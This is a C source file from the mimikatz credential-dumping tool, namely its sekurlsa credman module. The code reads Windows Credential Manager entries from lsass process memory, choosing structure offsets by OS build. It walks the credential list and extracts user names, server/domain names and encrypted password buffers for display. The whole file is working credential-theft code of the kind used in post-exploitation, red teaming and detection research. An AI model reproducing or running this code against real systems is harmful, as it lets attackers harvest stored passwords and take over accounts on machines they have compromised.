/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_credman.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = {L"credman", kuhl_m_sekurlsa_enum_logon_callback_credman, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_single_package[] = {&kuhl_m_sekurlsa_credman_package};

NTSTATUS kuhl_m_sekurlsa_credman(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_credman_single_package, 1);
}

const CREDMAN_INFOS credhelper[] = {
	{
		sizeof(KIWI_CREDMAN_LIST_ENTRY_5),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_5, Flink),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_5, user),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_5, server2),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_5, cbEncPassword),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_5, encPassword),
	},
	{
		sizeof(KIWI_CREDMAN_LIST_ENTRY_60),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, Flink),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, user),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, server2),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, cbEncPassword),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY_60, encPassword),
	},
	{
		sizeof(KIWI_CREDMAN_LIST_ENTRY),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, Flink),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, user),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, server2),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, cbEncPassword),
		FIELD_OFFSET(KIWI_CREDMAN_LIST_ENTRY, encPassword),
	},
};

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_CREDMAN_SET_LIST_ENTRY setList;
	KIWI_CREDMAN_LIST_STARTER listStarter;
	DWORD nbCred = 0;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&setList, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {pData->pCredentialManager, pData->cLsass->hLsassMem};
	PVOID pRef;
	KIWI_GENERIC_PRIMARY_CREDENTIAL kiwiCreds;
	ULONG CredOffsetIndex;
	
	if(pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA)
		CredOffsetIndex = 0;
	else if(pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_7)
		CredOffsetIndex = 1;
	else
		CredOffsetIndex = 2;

	if(aLsassMemory.address)
	{
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CREDMAN_SET_LIST_ENTRY)))
		{
			aLocalMemory.address = &listStarter;
			if(aLsassMemory.address = setList.list1)
			{
				pRef = (PBYTE) setList.list1 + FIELD_OFFSET(KIWI_CREDMAN_LIST_STARTER, start);
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CREDMAN_LIST_STARTER)))
				{
					if(aLsassMemory.address = listStarter.start)
					{
						if(aLocalMemory.address = LocalAlloc(LPTR, credhelper[CredOffsetIndex].structSize))
						{
							while(aLsassMemory.address != pRef)
							{
								aLsassMemory.address = (PBYTE) aLsassMemory.address - credhelper[CredOffsetIndex].offsetFLink;
								if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, credhelper[CredOffsetIndex].structSize))
								{
									kprintf(L"\n\t [%08x]", nbCred);
									kiwiCreds.UserName = *(PUNICODE_STRING) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetUsername);
									kiwiCreds.Domaine = *(PUNICODE_STRING) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetDomain);
									kiwiCreds.Password.Length = kiwiCreds.Password.MaximumLength = *(PUSHORT) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetCbPassword);;
									kiwiCreds.Password.Buffer = *(PWSTR *) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetPassword);
									kuhl_m_sekurlsa_genericCredsOutput(&kiwiCreds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS);
									aLsassMemory.address = *(PVOID *) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetFLink);
								}
								else break;
								nbCred++;
							}
							LocalFree(aLocalMemory.address);
						}
					}
				}
			}
		}
	}
}